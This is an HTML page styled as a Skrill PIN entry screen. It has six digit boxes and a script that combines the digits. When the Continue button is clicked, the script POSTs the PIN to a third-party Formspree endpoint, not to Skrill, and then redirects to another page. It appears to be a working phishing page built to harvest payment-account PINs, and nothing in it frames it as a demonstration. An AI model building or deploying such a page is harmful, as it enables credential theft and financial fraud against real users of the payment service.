<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Skrill PIN Entry</title>
    <style>
      *,
      :before,
      :after {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-gradient-from-position: ;
        --tw-gradient-via-position: ;
        --tw-gradient-to-position: ;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: rgb(59 130 246 / 0.5);
        --tw-ring-offset-shadow: 0 0 #0000;
        --tw-ring-shadow: 0 0 #0000;
        --tw-shadow: 0 0 #0000;
        --tw-shadow-colored: 0 0 #0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
      }
      ::backdrop {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-gradient-from-position: ;
        --tw-gradient-via-position: ;
        --tw-gradient-to-position: ;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: rgb(59 130 246 / 0.5);
        --tw-ring-offset-shadow: 0 0 #0000;
        --tw-ring-shadow: 0 0 #0000;
        --tw-shadow: 0 0 #0000;
        --tw-shadow-colored: 0 0 #0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
      }
      body {
        background-color: #ffffff;
        color: #000000;
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;

        height: 100vh;
        margin: 0;
      }
      .container {
        text-align: center;
        background: #f1edf138;
        padding: 3rem;
      }
      h2 {
        margin-bottom: 30px;
      }
      .account {
        background: #ffffff;
        padding: 10px 20px;
        border-radius: 10px;
        margin-bottom: 20px;
      }
      .pin-input {
        display: flex;
        justify-content: center;
        gap: 5px;
        margin-bottom: 20px;
      }
      .pin-input input {
        width: 20px;
        height: 50px;
        font-size: 24px;
        text-align: center;
        border: none;
        border-bottom: 2px solid #000000;
        background: transparent;
        color: #000000;
        outline: none;
      }
      .forgot {
        color: #b100ff;
        text-decoration: none;
        font-weight: bold;
        margin-top: 4rem;
      }
      .imglogo,
      .loginu {
        width: 100px;
        margin-left: auto;
        margin-right: auto;
        margin-bottom: 4rem;
        display: block;
      }
      .imglogo {
        border-style: none;
      }
      .imglogo {
        border: 0;
        border-top-style: none;
        border-right-style: none;
        border-bottom-style: none;
        border-left-style: none;
      }
      .bg-gray-100 {
        --tw-bg-opacity: 1;
        background-color: white;
      }
      .bg-white {
        --tw-bg-opacity: 1;
        background-color: #fafafa;
      }
      .bg-primary {
        --tw-bg-opacity: 1;
        background-color: #5f128d;
      }
      .mt-w {
        margin-top: 15rem;
      }
      .text-white {
        --tw-text-opacity: 1;
        color: rgb(255 255 255 / var(--tw-text-opacity));
      }
      .w-full {
        width: 100%;
      }
      .rounded-md {
        border-radius: 0.375rem;
      }
      .p-4 {
        padding: 1rem;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <img class="imglogo" src="asset/header-logo.png" />

      <p>Enter your PIN</p>
      <div class="pin-input">
        <input
          type="text"
          maxlength="1"
          inputmode="numeric"
          required
          pattern="[0-9]*"
        />
        <input
          type="text"
          maxlength="1"
          inputmode="numeric"
          required
          pattern="[0-9]*"
        />
        <input
          type="text"
          maxlength="1"
          inputmode="numeric"
          required
          pattern="[0-9]*"
        />
        <input
          type="text"
          maxlength="1"
          inputmode="numeric"
          required
          pattern="[0-9]*"
        />
        <input
          type="text"
          maxlength="1"
          inputmode="numeric"
          required
          pattern="[0-9]*"
        />
        <input
          type="text"
          maxlength="1"
          inputmode="numeric"
          required
          pattern="[0-9]*"
        />
      </div>
      <div class="forgot">Forgot PIN</div>
      <button
        id="redirectBtn"
        disabled
        class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
      >
        Continue
      </button>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const inputs = document.querySelectorAll(".pin-input input");
        const button = document.getElementById("redirectBtn");

        // Check if all inputs have values and enable the button
        function checkPinFilled() {
          const allFilled = Array.from(inputs).every(
            (input) => input.value.length === 1
          );
          button.disabled = !allFilled; // Enable or disable the button
        }

        inputs.forEach((input, index) => {
          input.addEventListener("input", (e) => {
            const value = e.target.value.replace(/[^0-9]/g, ""); // Allow only numbers
            e.target.value = value;

            // Move to next input if the current one is filled
            if (value && index < inputs.length - 1) {
              inputs[index + 1].focus();
            }

            checkPinFilled(); // Check if the PIN is completely filled
          });

          input.addEventListener("keydown", (e) => {
            if (e.key === "Backspace" && !input.value && index > 0) {
              inputs[index - 1].focus(); // Move to previous input on backspace
            }
          });
        });

        // Function to handle form submission using Formspree
        async function submitForm() {
          // Collect the PIN values from all the inputs
          const pin = Array.from(inputs)
            .map((input) => input.value)
            .join("");

          // Prepare the form data
          const formData = new FormData();
          formData.append("pin", pin); // Append the PIN to the form data

          try {
            let response = await fetch("https://formspree.io/f/xoveqrzb", {
              method: "POST",
              body: formData,
              headers: {
                Accept: "application/json",
              },
            });

            if (response.ok) {
              // Redirect to another page after successful form submission
              window.location.href = "pin.html"; // Redirect as needed
            } else {
              alert("Failed to submit the PIN. Please try again.");
            }
          } catch (error) {
            alert("An error occurred. Please try again later.");
          }
        }

        // Attach an event listener to the button for form submission
        button.addEventListener("click", function () {
          submitForm(); // Call the submitForm function when the button is clicked
        });
      });
    </script>
  </body>
</html>
